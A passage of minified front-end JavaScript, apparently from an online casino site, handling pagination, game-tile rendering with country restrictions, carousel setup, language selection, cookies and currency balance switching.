            n = this.config.item_container.querySelectorAll(this.config.itemSelector);
        for (let e = 0; e < n.length; e++) e >= a || e < s ? (n[e].style.display = "none", n[e].classList.remove("visible"), n[e].classList.add("hidden")) : (n[e].style.display = this.config.visDis, setTimeout((function() {
            n[e].classList.remove("hidden"), n[e].classList.add("visible")
        }), 20));
        this.config.pagination_containers.forEach((function(t) {
            var s = t.querySelectorAll(".page_link");
            for (let t = 0; t < s.length; t++) s[t].getAttribute("longdesc") == e ? (s[t].classList.add("active_page"), s[t].classList.add(this.config.activeClass)) : (s[t].classList.remove("active_page"), s[t].classList.remove(this.config.activeClass)), e == t || t == e + 1 && e != s.length - 1 || t == e - 1 && 0 != e || e + 2 == t && 0 == e || e - 2 == t && e == s.length - 1 ? s[t].style.display = "inline" : s[t].style.display = "none"
        }), this), this.current_page = e, this.toggleMoreLess(), this.config.wrapAround || this.tagNextPrev(), this.config.onPageDisplayed.call(this, e + 1)
    }
    movePageNumbersLeft(e, t) {
        var s = t;
        e.parentNode.querySelectorAll(".page_link").forEach((function(e) {
            e.getAttribute("longdesc") != s || e.classList.contains("active_page") || "none" != e.style.display || this.config.pagination_containers.forEach((function(e) {
                var t = e.querySelectorAll(".page_link");
                for (let e = 0; e < t.length; e++) page_num == e || e == page_num + 1 && page_num != t.length - 1 || e == page_num - 1 && 0 != page_num || page_num + 2 == e && 0 == page_num || page_num - 2 == e && page_num == t.length - 1 ? t[e].style.display = "inline" : t[e].style.display = "none"
            }), this)
        }), this)
    }
    movePageNumbersRight(e, t) {
        var s = t;
        e.parentNode.querySelectorAll(".page_link").forEach((function(e) {
            e.getAttribute("longdesc") != s || e.classList.contains("active_page") || "none" != e.style.display || this.config.pagination_containers.forEach((function(e) {
                var t = e.querySelectorAll(".page_link");
                for (let e = 0; e < t.length; e++) page_num == e || e == page_num + 1 && page_num != t.length - 1 || e == page_num - 1 && 0 != page_num || page_num + 2 == e && 0 == page_num || page_num - 2 == e && page_num == t.length - 1 ? t[e].style.display = "inline" : t[e].style.display = "none"
            }), this)
        }), this)
    }
    toggleMoreLess() {
        this.config.pagination_containers.forEach((function(e) {
            var t = e.querySelector(".more");
            null != t && (t.style.display = "none", e.querySelector(".page_link.last") && this.isHidden(e.querySelector(".page_link.last")) && (t.style.display = "inline"));
            var s = e.querySelector(".less");
            null != s && (s.style.display = "none", e.querySelector(".page_link.first") && this.isHidden(e.querySelector(".page_link.first")) && (s.style.display = "inline"))
        }), this)
    }
    tagNextPrev() {
        this.config.pagination_containers.forEach((function(e) {
            var t = e.querySelector(".next_link"),
                s = e.querySelector(".previous_link"),
                a = e.querySelector(".first_link"),
                n = e.querySelector(".last_link");
            e.querySelector(".page_link.last") && e.querySelector(".page_link.last").classList.contains("active_page") ? (null != t && (t.classList.add("no_more"), t.classList.add(this.config.disabledClass)), null != n && (n.classList.add("no_more"), n.classList.add(this.config.disabledClass))) : (null != t && (t.classList.remove("no_more"), t.classList.remove(this.config.disabledClass)), null != n && (n.classList.remove("no_more"), n.classList.remove(this.config.disabledClass))), e.querySelector(".page_link.first") && e.querySelector(".page_link.first").classList.contains("active_page") ? (null != s && (s.classList.add("no_more"), s.classList.add(this.config.disabledClass)), null != a && (a.classList.add("no_more"), a.classList.add(this.config.disabledClass))) : (null != s && (s.classList.remove("no_more"), s.classList.remove(this.config.disabledClass)), null != a && (a.classList.remove("no_more"), a.classList.remove(this.config.disabledClass)))
        }), this)
    }
    isHidden(e) {
        var t = window.getComputedStyle(e);
        return "none" === t.display || "hidden" === t.visibility
    }
}
const ua = window.navigator.userAgent.toLowerCase(),
    isiPad = ua.indexOf("ipad") > -1 || ua.indexOf("macintosh") > -1 && "ontouchend" in document,
    isM = /(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i.test(navigator.userAgent.toLowerCase());

function isMobile() {
    return isM || isiPad && document.body.clientWidth < 1025 || window.innerWidth < 1025
}
let mySwiperLobby, mSwSlots, mySwiperRec1, calkSL, rankSL, mySwiperBest, mySwiperFor1, mySwiperLob1, mySwiperLob2, mySwiperFeat, mySwiperFeat1, mySwiperCas, mySwiperProv, mySwiperMSL2, mySwiperMSL4, mySwiperMain, swSl, swSl1, getImg5 = e => {
        e || (e = ["", {
            pc: "",
            m: "",
            n: ""
        }]);
        let t = `/const/slotimg/jpeg/1x/${e[0]}.jpeg`,
            s = `/const/slotimg/jpeg/2x/${e[0]}.jpeg`,
            a = `/slot/game/${e[0]}/`,
            n = "sl";
        return 1 == e[1].i && (a = `/slot/tgg/${e[0]}/`, t = "/const/tgg/jpeg/1x/" + e[0] + ".jpeg", s = "/const/tgg/jpeg/1x/" + e[0] + ".jpeg", n = "tgg"), 3 == e[1].i && (a = `/slot/soft/${e[1].pc}/${e[1].m}/`, t = "/const/soft/jpeg/1x/" + e[0] + ".jpeg", s = "/const/soft/jpeg/1x/" + e[0] + ".jpeg", n = "sf"), 2 == e[1].i && (a = `/slot/5men/${e[0]}/`, t = "/const/5men/jpeg/1x/" + e[0] + ".jpeg", s = "/const/5men/jpeg/1x/" + e[0] + ".jpeg", n = "5m"), 4 == e[1].i && (a = `/slot/netgame/${e[0]}/`, t = "/const/netgame/jpeg/1x/" + e[1].n.replace(/ /g, "-") + ".jpeg", s = "/const/netgame/jpeg/1x/" + e[1].n.replace(/ /g, "-") + ".jpeg", n = "ng"), 5 == e[1].i && (a = `/slot/ss/${e[0]}/`, t = "/const/ss/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg", s = "/const/ss/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg", n = "sw"), 6 == e[1].i && (a = `/slot/pragmatic/${e[0]}/`, t = "/const/pragmatic/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg", s = "/const/pragmatic/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg", n = "pr"), 7 == e[1].i && (a = `/tvbet/game/${e[0]}/`, t = "/const/tvbet/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg?x=11", s = "/const/tvbet/jpeg/1x/" + e[0].replace(":", "_") + ".jpeg?x=11", n = "tv"), "JetGames" == e[1].p && (t = "/const/jetgames/png/" + e[0] + ".png?x=2", s = "/const/jetgames/png/" + e[0] + ".png?x=2", a = e[1].s, n = "jg"), 8 == e[1].i && (a = `/slot/jetslot/${e[0]}/`, t = "/const/jetslot/jpeg/1x/" + e[0] + ".jpeg?x=11", s = "/const/jetslot/jpeg/1x/" + e[0] + ".jpeg?x=11", n = "jet"), {
            href: t,
            hrefx2: s,
            hrefG: a,
            posta: n
        }
    },
    closeSelDep2 = e => {
        let t = e.getElementsByClassName("selectT5");
        Array.from(t).forEach((e => {
            e.classList.contains("active") && e.classList.remove("active")
        }))
    },
    disGameCh = e => !(!e[1].re || null == soft_countriesRestrictions[e[1].re] || !soft_countriesRestrictions[e[1].re].split || -1 == soft_countriesRestrictions[e[1].re].split(",").findIndex((e => e == userCountry))) || !(0 != e[1].i && 5 != e[1].i && 6 != e[1].i || null == slot_countriesRestrictions[e[1].p] || !slot_countriesRestrictions[e[1].p].split || -1 == slot_countriesRestrictions[e[1].p].split(",").findIndex((e => e == userCountry))),
    addSearchGames = (e, t, s) => {
        let a = "" != t ? `${t}_cont54` : "block_search_id54";
        a = document.getElementById(a);
        let n = "";
        if (e.forEach((e => {
                let t = getImg5(e),
                    s = t.href,
                    a = t.hrefx2,
                    r = t.hrefG,
                    o = t.posta,
                    i = 1;
                e[1].t && (i = e[1].t), 0 == e[1].d && (i = 2);
                let l = "",
                    c = `onclick="openGC(this.dataset.href,1,'${e[1].s}',this.dataset.name,'${i}',this.dataset.p,this,0,this.dataset.pr)"`;
                e[1].re && null != soft_countriesRestrictions[e[1].re] && soft_countriesRestrictions[e[1].re].split && -1 != soft_countriesRestrictions[e[1].re].split(",").findIndex((e => e == userCountry)) && (l = "disGame", c = ""), 0 != e[1].i && 5 != e[1].i && 6 != e[1].i || null != slot_countriesRestrictions[e[1].p] && slot_countriesRestrictions[e[1].p].split && -1 != slot_countriesRestrictions[e[1].p].split(",").findIndex((e => e == userCountry)) && (l = "disGame", c = ""), disGameCh(e) && (l = "disGame", c = "");
                let d = `\n      <div class=" mRsOE swiper-slide bot-view game-its">\n      <a ${c} data-p='${o}' data-pr='${e[1].p}' data-name="${e[1].n.replaceAll('"',"'")}" class=" ${l} dbJiKC game-item-wrap " href = "javascript:void(0);"  data-href="${r}">\n            <div class="lazy-img img"><img loading="lazy" onError="imageFix(this,this.alt)" data-src="${e[0]}"   srcset="${a} 2x,${s} 1x"\n            alt="${e[1].n}">\n            </div>\n            <div class="hover-mask">\n            \n            <svg class="play-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 63 63">\n                <defs></defs>\n                <g fill="none" fill-rule="evenodd">\n                    <circle cx="31.3" cy="31.3" r="30.3" fill="#000" fill-opacity=".2" stroke="#E5E7EE" stroke-width="2"></circle>\n                    <path fill="#F5F6F7" d="M39.5 34.3l-11.3 7.5a2 2 0 01-3-1.6v-15a2 2 0 013-1.7L39.5 31a2 2 0 010 3.3z"></path>\n                </g>\n            </svg>\n            <div class="game_name3 gn50">${e[1].n}</div>\n            <div class="game_prov3 gp50">${e[1].p}</div>\n            </div>\n        </a>\n    </div>\n      `;
                n += d
            })), 2 != s) {
            let e = a.getElementsByClassName("game-its");
            Array.from(e).forEach((e => {
                e.outerHTML = ""
            }))
        }
        a.innerHTML += n
    },
    imageFix = (e, t = !1) => {
        if (e.srcset = "/assets/pika.png?x=10 1x,/assets/pika2x.png?x=10 2x", t) {
            let s = e.parentNode.parentNode;
            s && s.classList.add("changeImageGame");
            let a = (new TextEncoder).encode(t).join(",").replaceAll(",", "");
            s && s.classList.add("g" + a), s && (s.innerHTML += `<style>.${"g"+a}::after{content:"${t}"}</style>`)
        }
    },
    objCatNames = {
        originals: lp.original,
        rek_live: lp["recommended live"],
        cold24: lp.cold,
        hot24: lp.hot,
        slots: lp.slot,
        live_cas: lp["live casino"],
        buy_bonus: "Bonus Buy",
        "сardslv": "Cards",
        popularlv: "Popular",
        blackjacklv: "Blackjack",
        dicelv: "Dice",
        lotolv: "Lotto"
    };
1 == window.user_il && setInterval((async () => {
    let e = await axios.get("https://jetgamescdn.com/apps/currency/rates.txt");
    window.listCurs = {
        data: {
            rates: {}
        }
    }, window.listCurs.data.rates = e.data, 1 == stBal0 && user_il && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && user_il && (getUSD(2), getUSD(1))
}), 9e4);
let updateMainSLider = () => {
        1 == statusMainPage && (mySwiperMain ? (mySwiperMain.update(), mySwiperMain.params.loopPreventsSlide = !1) : mySwiperMain = new Swiper(".gradient-wrap", {
            loop: !0,
            loopedSlides: 2,
            autoplay: {
                delay: 5e3,
                pauseOnMouseEnter: !0,
                disableOnInteraction: !1
            },
            loopAdditionalSlides: 1,
            slidesPerView: 3,
            breakpoints: {
                320: {
                    slidesPerView: 1
                },
                768: {
                    slidesPerView: 2
                },
                1024: {
                    slidesPerView: 3
                }
            },
            allowTouchMove: !0,
            navigation: {
                nextEl: ".navigation-next-banner",
                prevEl: ".navigation-prev-banner"
            }
        })), 2 == statusMainPage && (mySwiperMSL2 ? (mySwiperMSL2.update(), mySwiperMSL2.params.loopPreventsSlide = !1) : mySwiperMSL2 = new Swiper(".gradient-wrap2", {
            loop: !0,
            loopedSlides: 2,
            autoplay: {
                delay: 5e3,
                pauseOnMouseEnter: !0,
                disableOnInteraction: !1
            },
            loopAdditionalSlides: 1,
            slidesPerView: 3,
            breakpoints: {
                320: {
                    slidesPerView: 1
                },
                768: {
                    slidesPerView: 2
                },
                1024: {
                    slidesPerView: 3
                }
            },
            allowTouchMove: !0,
            navigation: {
                nextEl: ".navigation-next-banner2",
                prevEl: ".navigation-prev-banner2"
            }
        })), 4 == statusMainPage && (mySwiperMSL4 ? (mySwiperMSL4.update(), mySwiperMSL4.params.loopPreventsSlide = !1) : mySwiperMSL4 = new Swiper(".gradient-wrap4", {
            loop: !0,
            loopedSlides: 2,
            autoplay: {
                delay: 5e3,
                pauseOnMouseEnter: !0,
                disableOnInteraction: !1
            },
            loopAdditionalSlides: 1,
            slidesPerView: 3,
            breakpoints: {
                320: {
                    slidesPerView: 1
                },
                768: {
                    slidesPerView: 2
                },
                1024: {
                    slidesPerView: 3
                }
            },
            allowTouchMove: !0,
            navigation: {
                nextEl: ".navigation-next-banner4",
                prevEl: ".navigation-prev-banner4"
            }
        }))
    },
    createSliders = () => {
        if (window.innerWidth > 1024) {
            if (1 == statusMainPage) {
                let e = document.getElementsByClassName("navblss5")[0].offsetWidth < document.getElementsByClassName("lobby_slider_sw")[0].offsetWidth ? 0 : 100;
                mySwiperLobby ? mySwiperLobby.update() : mySwiperLobby = new Swiper(".lobby_slider_sw", {
                    slidesPerView: "auto",
                    freeMode: !0,
                    simulateTouch: !0,
                    slidesOffsetAfter: e,
                    allowTouchMove: !0
                }), mySwiperBest ? mySwiperBest.update() : mySwiperBest = new Swiper(".best_slider_sw", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    allowTouchMove: !0,
                    navigation: {
                        prevEl: ".navigation-prev-home-slots",
                        nextEl: ".navigation-next-home-slots"
                    }
                }), mySwiperLob1 ? mySwiperLob1.update() : mySwiperLob1 = new Swiper(".tops_slider_sw1", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    allowTouchMove: !0,
                    navigation: {
                        prevEl: ".navigation-prev-home-top1",
                        nextEl: ".navigation-next-home-top1"
                    }
                }), mySwiperFor1 ? mySwiperFor1.update() : mySwiperFor1 = new Swiper(".for_slider_sw2", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    allowTouchMove: !0,
                    navigation: {
                        prevEl: ".navigation-prev-home-for2",
                        nextEl: ".navigation-next-home-for2"
                    }
                }), mySwiperLob2 ? mySwiperLob2.update() : mySwiperLob2 = new Swiper(".tops_slider_sw2", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-top2",
                        nextEl: ".navigation-next-home-top2"
                    }
                }), mySwiperFeat1 ? mySwiperFeat1.update() : mySwiperFeat1 = new Swiper(".feature_slider_sw1", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-feature1-slots",
                        nextEl: ".navigation-next-home-feature1-slots"
                    }
                }), mySwiperCas ? mySwiperCas.update() : mySwiperCas = new Swiper(".casual_slider_sw", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-casual-slots",
                        nextEl: ".navigation-next-home-casual-slots"
                    }
                }), mySwiperFeat ? mySwiperFeat.update() : mySwiperFeat = new Swiper(".feature_slider_sw", {
                    slidesPerView: 9,
                    spaceBetween: 10,
                    allowTouchMove: !0,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-feature-slots",
                        nextEl: ".navigation-next-home-feature-slots"
                    }
                }), mySwiperProv ? mySwiperProv.update() : mySwiperProv = new Swiper(".prov_slider_sw", {
                    loop: !0,
                    slidesPerView: 9,
                    spaceBetween: 10,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7
                        },
                        1450: {
                            slidesPerView: 9
                        }
                    },
                    allowTouchMove: !0,
                    navigation: {
                        prevEl: ".navigation-prev-provider",
                        nextEl: ".navigation-next-provider"
                    }
                }), mySwiperRec1 ? mySwiperRec1.update() : mySwiperRec1 = new Swiper(".rece_slider_sw", {
                    allowTouchMove: !0,
                    slidesPerView: 9,
                    spaceBetween: 10,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-live-slots",
                        nextEl: ".navigation-next-home-live-slots"
                    }
                })
            }
            if (2 == statusMainPage || 4 == statusMainPage) {
                let e = 2 == statusMainPage ? "" : "1",
                    t = document.getElementsByClassName("navblss" + e)[0].offsetWidth < document.getElementsByClassName("l_slots_sw" + e)[0].offsetWidth ? 0 : 100;
                mSwSlots ? mSwSlots.update() : mSwSlots = new Swiper(".l_slots_sw" + e, {
                    slidesPerView: "auto",
                    freeMode: !0,
                    simulateTouch: !0,
                    slidesOffsetAfter: t,
                    allowTouchMove: !0
                }), swSl ? swSl.update() : swSl = new Swiper(".recsl_slider_sw", {
                    allowTouchMove: !0,
                    slidesPerView: 9,
                    spaceBetween: 10,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-sl",
                        nextEl: ".navigation-next-home-sl"
                    }
                }), swSl1 ? swSl1.update() : swSl1 = new Swiper(".recsl1_slider_sw", {
                    allowTouchMove: !0,
                    slidesPerView: 9,
                    spaceBetween: 10,
                    breakpoints: {
                        320: {
                            slidesPerView: 3
                        },
                        768: {
                            slidesPerView: 4
                        },
                        1024: {
                            slidesPerView: 7,
                            slidesPerGroup: 6
                        },
                        1450: {
                            slidesPerView: 9,
                            slidesPerGroup: 7
                        }
                    },
                    navigation: {
                        prevEl: ".navigation-prev-home-sl1",
                        nextEl: ".navigation-next-home-sl1"
                    }
                })
            }
        }
        3 == statusMainPage && (rankSL ? rankSL.update() : rankSL = new Swiper(".rank_slider_sw1", {
            allowTouchMove: !0,
            slidesPerView: 5,
            spaceBetween: 20,
            initialSlide: rankCenter,
            breakpoints: {
                320: {
                    slidesPerView: 1
                },
                768: {
                    slidesPerView: 3
                },
                1024: {
                    slidesPerView: 4,
                    slidesPerGroup: 3
                },
                1450: {
                    slidesPerView: 5,
                    slidesPerGroup: 4
                }
            },
            pagination: {
                el: ".swiper-paginationR",
                type: "bullets",
                clickable: !0
            },
            navigation: {
                prevEl: ".navigation-prev-rank1",
                nextEl: ".navigation-next-rank1"
            }
        })), 40 == statusMainPage && (calkSL ? calkSL.update() : calkSL = new Swiper(".cals_slider_sw1", {
            allowTouchMove: !0,
            slidesPerView: 5,
            spaceBetween: 16,
            initialSlide: calCenter,
            centeredSlides: !0,
            centeredSlidesBounds: !0,
            breakpoints: {
                300: {
                    slidesPerView: 1
                },
                370: {
                    slidesPerView: 2
                },
                768: {
                    slidesPerView: 3
                },
                1024: {
                    slidesPerView: 3,
                    slidesPerGroup: 1
                },
                1300: {
                    slidesPerView: 5,
                    slidesPerGroup: 1
                }
            },
            navigation: {
                prevEl: ".pr_ca_b",
                nextEl: ".ne_ca_b"
            }
        }))
    },
    openSelect5 = e => {
        let t = document.getElementsByClassName(e)[0];
        t.classList.contains("active") ? t.classList.remove("active") : t.classList.add("active")
    },
    changeSelect5 = (e, t, s, a, n) => {
        t = document.getElementById(t), 1 != a && 2 != a || (t.dataset.id = n), t.innerHTML = 2 == a ? n : e.innerHTML, openSelect5(s)
    };
window.previousUrlGame = 0 == isBlog ? null : window.location.href;
let opeLngBlock = (e = !1) => {
        let t, s = window.innerWidth > 1024 ? "select-desc" : "select-mob";
        if (1 == e && (s = "select-cab"), 2 == e && (s = "select-reg"), 3 == e && (s = "select-cur"), s = document.getElementsByClassName(s)[0], 1 == e && (t = () => {
                opeLngBlock(1)
            }), 2 == e && (t = () => {
                opeLngBlock(2)
            }), 3 == e && (t = () => {
                opeLngBlock(3)
            }), s.classList.contains("active")) {
            s.classList.remove("active"), 1 != e && 2 != e && 3 != e && window.removeEventListener("click", opeLngBlock);
            let t = "modal_settings";
            if (2 != e && 3 != e || (t = "modal_extraReg"), 1 == e || 2 == e || 3 == e) {
                let e = document.getElementsByClassName(t)[0];
                e && (e.onclick = () => {})
            }
        } else {
            s.classList.add("active");
            let a = "modal_settings";
            2 != e && 3 != e || (a = "modal_extraReg"), 1 != e && 2 != e && 3 != e || setTimeout((() => {
                let e = document.getElementsByClassName(a)[0];
                e && (e.onclick = () => {
                    t()
                })
            }), 100), setTimeout((() => {
                1 != e && 2 != e && 3 != e && window.addEventListener("click", opeLngBlock)
            }), 0)
        }
    },
    openListGsStat = () => {
        let e = "select-stat";
        e = document.getElementsByClassName(e)[0], e.classList.contains("active") ? (e.classList.remove("active"), window.removeEventListener("click", openListGsStat)) : (e.classList.add("active"), setTimeout((() => {
            window.addEventListener("click", openListGsStat)
        }), 0))
    },
    openSportMenu = e => {
        e.stopPropagation(), e.preventDefault();
        let t = (e = e.currentTarget).getAttribute("href");
        0 != sportNewST && btNewSport ? (t = t.replace("bbet/?bt-path=", ""), btNewSport.updateOptions({
            url: decodeURIComponent(t)
        })) : (openHistory(t, 2), sportTG(2), openSport(1));
        let s = document.getElementsByClassName("textDropCoins673888")[0];
        s = s.getElementsByTagName("a"), Array.from(s).forEach((e => {
            e.classList.remove("active")
        })), e.classList.add("active"), isMobile() && burgerSt && burgerDesc()
    },
    setDGWSl = () => {
        if (1 == window.user_il) {
            let e = document.getElementsByClassName("currencyBal11")[0];
            e = e.getElementsByClassName("font-digits")[0], 0 == Number(e.innerHTML.replace(/[^.\d]+/g, "").replace(/^([^\.]*\.)|\./g, "$1")) ? (e = document.getElementsByClassName("modal_chooseSlot")[0], e && e.classList.add("nomon45")) : (e = document.getElementsByClassName("modal_chooseSlot")[0], e && e.classList.remove("nomon45"))
        }
    },
    chaBal = (e, t = !1) => {
        let s = document.getElementsByClassName("b_l_c111");
        Array.from(s).forEach((e => {
            e.classList.remove("user-money05")
        }));
        let a = document.getElementsByClassName("currencyBal11")[0],
            n = a.getElementsByClassName("currency__coin")[0];
        if (n.setAttribute("src", e.currentTarget.getElementsByClassName("currency__coin")[0].src), n = a.getElementsByClassName("font-digits")[0], n.innerHTML = e.currentTarget.getElementsByClassName("font-digits")[0].innerHTML, e.currentTarget.getElementsByClassName("b_l_c111")[0].classList.add("user-money05"), userBetCur = e.currentTarget.getElementsByClassName("currency__coin")[0].alt, t || openBalance(document.getElementsByClassName("balanceOpen11")[0]), 5 != t && 2 != t) {
            let t = e.currentTarget.dataset.cur,
                s = new FormData;
            s.set("action", "changeCurrentCurrency"), s.set("current", t), axios.post("/user/func.php", s).then((e => {
                if (0 != e.data.error) createNotifyL(1, e.data.message, lp.Error);
                else if (0 != statusGameOPEN) {
                    let e = new FormData;
                    e.set("action", "entry"), axios({
                        method: "post",
                        url: "/user/func.php",
                        data: e,
                        headers: {
                            "Content-Type": "multipart/form-data"
                        }
                    }).then((async s => {
                        if (0 == (s = s.data).error) {
                            let a;
                            userBetCur = s.userBetCur, userBetCur1 = s.userBetCur1, minCur = betListCur[userBetCur] ? betListCur[userBetCur].min : "", maxCur = betListCur[userBetCur] ? betListCur[userBetCur].max : "", window.changeCurrencyJet && (a = await window.changeCurrencyJet()), 64 == a ? (userBetCur = userBetLast, userBetCur1 = userBetLast1, minCur = betListCur[userBetCur] ? betListCur[userBetCur].min : "", maxCur = betListCur[userBetCur] ? betListCur[userBetCur].max : "", e = new FormData, e.set("action", "changeCurrentCurrency"), e.set("current", userBetCur), axios.post("/user/func.php", e).then((e => {
                                if (0 == e.data.error) {
                                    let e = document.getElementsByClassName("balance_cur_" + userBetCur)[0];
                                    e && chaBal({
                                        currentTarget: e
                                    }, 2)
                                }
                            }))) : userBetCur = t
                        }
                    })).catch((function(e) {
                        createNotifyL(1, e.message, lp.Error)
                    }))
                } else {
                    if (userBetCur = t, "slots-game" == pageNameM) {
                        let e = gC("game_game_txt")[0];
                        if (e && (e = e.getElementsByTagName("span")[0]), gameProvsCur[gameProv11]) {
                            let t = gameProvsCur[gameProv11].find((e => e == userBetCur)); - 1 == t && (t = "USD"), e && (e.innerHTML = t)
                        } else e && (e.innerHTML = "USD");
                        gD("iframe-desc6") && (gD("iframe-desc6").src = gD("iframe-desc6").src)
                    }
                    "Bonuses" == pageNameM && getJETInfo(1)
                }
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
        setDGWSl()
    };

function getCookie(e) {
    let t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return t ? decodeURIComponent(t[1]) : void 0
}

function setCookie(e, t, s = {}) {
    (s = {
        path: "/",
        ...s
    }).expires instanceof Date && (s.expires = s.expires.toUTCString());
    let a = encodeURIComponent(e) + "=" + encodeURIComponent(t);
    for (let e in s) {
        a += "; " + e;
        let t = s[e];
        !0 !== t && (a += "=" + t)
    }
    document.cookie = a
}

function deleteCookie(e) {
    setCookie(e, "", {
        "max-age": -1
    })
}
let lngArrMain = {
        en: "English",
        de: "Deutsch",
        fr: "Français",
        es: "Español",
        hi: "हिन्दी",
        id: "Indonesian",
        ja: "日本語",
        ko: "한국어",
        zh: "中文",
        pt: "Português",
        ru: "Русский",
        tr: "Türkçe",
        pl: "Polski",
        az: "Azərbaycan",
        ua: "Україна",
        fa: "فارسی",
        fi: "Suomen"
    },
    changeLanguage = e => {
        e = e.toLowerCase(), null == lngArrMain[e] && (e = "en"), document.cookie = `lng=${e}; max-age=31536000; path=/`;
        let t = document.getElementsByClassName("lng_choose_" + e);
        Array.from(t).forEach((e => {
            e.classList.add("active")
        })), t = document.getElementsByClassName("lng_main_text"), Array.from(t).forEach((t => {
            t.innerHTML = lngArrMain[e]
        })), t = document.getElementsByClassName("lng_main_img"), Array.from(t).forEach((t => {
            t.setAttribute("src", `/assets/flags/${e}.svg?x=5`), t.setAttribute("alt", e)
        }))
    },
    changeCoutry = (e = !1, t = !1) => {
        let s = document.getElementsByClassName("select-country")[0],
            a = s.getElementsByClassName("select-option");
        Array.from(a).forEach((e => {
            e.classList.remove("active")
        })), e && e.classList.add("active");
        let n = e.innerHTML;
        if (e || (n = t), a = document.getElementsByClassName("lng_con_text")[0], a.innerHTML = n, a.dataset.a = n, 0 != t) return s.classList.add("close"), a = s.getElementsByClassName("select-trigger")[0], void a.setAttribute("onclick", "");
        openSelect5("select-country")
    };

function chaLng(e, t = 0, s = 0) {
    let a = new FormData,
        n = 1 == t ? e.innerHTML : e.getElementsByClassName("lng_img_117")[0].getAttribute("alt");
    n != getCookieChat("lng") && (a.set("lng", n), axios({
        method: "post",
        url: "/language/setlng.php",
        data: a,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((() => {
        0 == s ? window.location.reload() : (changeLanguage(n), opeLngBlock(2))
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    })))
}
let pageWG11, curNumSlot, openSettingsSLots = () => {
        let e = gC("settings_slots")[0];
        e && (e.classList.contains("active") ? (e.classList.remove("active"), window.removeEventListener("click", openSettingsSLots)) : (e.classList.add("active"), setTimeout((() => {
            window.addEventListener("click", openSettingsSLots)
        }), 0)))
    },
    openDesc12 = () => {
        openBalance(document.getElementsByClassName("balance")[0])
    },
    stBalUsd = 2,
    stBal0 = 2,
    arrayUsd = [],
    getCurs0 = e => {
        stBal0 = e, localStorage.setItem("modeNul", stBal0);
        let t = [];
        if (1 == e) {
            let e = stFiat ? arrayCurrencyFiat : arrayCurrency;
            if (1 == stBalUsd && (e = arrayUsd), t = e.filter((e => Number(e[1]) > 0)), null == t.find((e => "JET" == e[0])) && Number(JETblock) > 0) {
                let s = e.find((e => "JET" == e[0]));
                null != s && t.unshift(s)
            }
            arrayUsd = t;
